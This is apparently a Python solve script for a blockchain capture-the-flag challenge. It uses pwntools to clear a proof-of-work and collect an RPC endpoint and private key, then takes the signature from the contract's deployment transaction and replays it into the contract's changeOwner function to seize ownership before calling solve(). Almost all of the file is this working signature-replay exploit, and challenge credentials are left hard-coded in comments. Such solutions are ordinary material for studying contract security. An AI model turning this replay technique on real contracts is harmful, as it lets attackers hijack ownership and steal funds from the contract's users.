import json
from web3 import Web3
from pwn import *
from eth_account.messages import defunct_hash_message
from eth_account._utils.signing import extract_chain_id, to_standard_v
from eth_account._utils.legacy_transactions import serializable_unsigned_transaction_from_dict
from eth_utils.curried import keccak
import string

# Token: b'b9507449cbad288eefb092d70be5bed5f149c118b2666ed9986f30f15f4853f1'
# URL: https://challs.polygl0ts.ch:8545/b9507449cbad288eefb092d70be5bed5f149c118b2666ed9986f30f15f4853f1
# RPC endpoint: https://challs.polygl0ts.ch:8545/b9507449cbad288eefb092d70be5bed5f149c118b2666ed9986f30f15f4853f1
# Private key: 0x0889f5a98ce0409689100f1c0ac6567a382ec76610c4e29c4b3e59f893da29aa
# Challenge: 0x472887f79dF39f224388b632d4519D9b79ca555B

# token = "b9507449cbad288eefb092d70be5bed5f149c118b2666ed9986f30f15f4853f1"
# rpc_url = f"https://challs.polygl0ts.ch:8545/{token}"
# privk = "0x0889f5a98ce0409689100f1c0ac6567a382ec76610c4e29c4b3e59f893da29aa"
# challenge_addr = "0x472887f79dF39f224388b632d4519D9b79ca555B"

r = remote(args.get('HOST', "chall.polygl0ts.ch"), args.get('PORT', 9056))

r.recvuntil(b"action? ")
r.sendline(b"1")

r.recvuntil(b"prefix:")
prefix = r.recvline().strip().decode()
r.recvuntil(b"difficulty:")
difficulty = int(r.recvline().strip().decode())
TARGET = 2 ** (256 - difficulty)
alphabet = string.ascii_letters + string.digits + "+/"
answer = iters.bruteforce(
    lambda x: int.from_bytes(util.hashes.sha256sum((prefix + x).encode()), "big")
    < TARGET,
    alphabet,
    length=7,
)
r.sendlineafter(b">", answer.encode())
r.recvuntil(b"token:")
token = r.recvline().strip()
print(f"Token: {token}")
r.recvuntil(b"rpc endpoint:")
rpc_url = r.recvline().strip().decode()
print(f"URL: {rpc_url}")
print(f"RPC endpoint: {rpc_url}")
r.recvuntil(b"private key:")
privk = r.recvline().strip().decode()
print(f"Private key: {privk}")
r.recvuntil(b"challenge contract:")
challenge_addr = r.recvline().strip().decode()
print(f"Challenge: {challenge_addr}")

# You need contract ABI
with open('abi.json', 'r') as openfile:
    abi = json.load(openfile)

w3 = Web3(Web3.HTTPProvider(rpc_url))
# Create smart contract instance
contract = w3.eth.contract(address=challenge_addr, abi=abi)

print(f"Is challenge solved: {contract.functions.isSolved().call()}")
blck = w3.eth.get_block(1)
tx_hash = blck.transactions[0] # contract deployment transaction
tx = w3.eth.get_transaction(tx_hash)
print(tx)

v, r, s = tx["v"], w3.to_int(tx["r"]), w3.to_int(tx["s"])
v = to_standard_v(extract_chain_id(v)[1])

print(v, hex(r), hex(s)[2:].zfill(64))

s = w3.eth.account._keys.Signature(vrs=(
    to_standard_v(extract_chain_id(tx["v"])[1]),
    w3.to_int(tx["r"]),
    w3.to_int(tx["s"])
))

keys_to_get = ["to",
    "nonce",
    "value",
    "gas",
    "chainId",
    "maxFeePerGas",
    "maxPriorityFeePerGas",
    "type"]

if "chainId" not in tx:
    tx["chainId"] = 1

tt = {k:tx[k] for k in keys_to_get}
tt["data"] = tx["input"]


ut = serializable_unsigned_transaction_from_dict(tt)
print(ut.hash(), ut.hash().hex())

prefixed_hash = ut.hash() # ut.hash()
# addr = s.recover_public_key_from_msg_hash(prefixed_hash).to_checksum_address()
addr = w3.eth.account._recover_hash(prefixed_hash, (s.v, s.r, s.s))
print(addr)

our_account = w3.eth.account.from_key(privk)
address = our_account.address
print(address)

print(tx['v'], to_standard_v(extract_chain_id(tx["v"])[1]), to_standard_v(tx["v"]))

owner = contract.functions.owner().call()
print(owner)

tx = contract.functions.changeOwner(tx["v"] + 27, tx['r'], tx['s'], prefixed_hash, address).transact({'from': address})
print(tx)

owner = contract.functions.owner().call()
print(owner)

contract.functions.solve().transact({'from': address})
print(f"Is challenge solved: {contract.functions.isSolved().call()}")

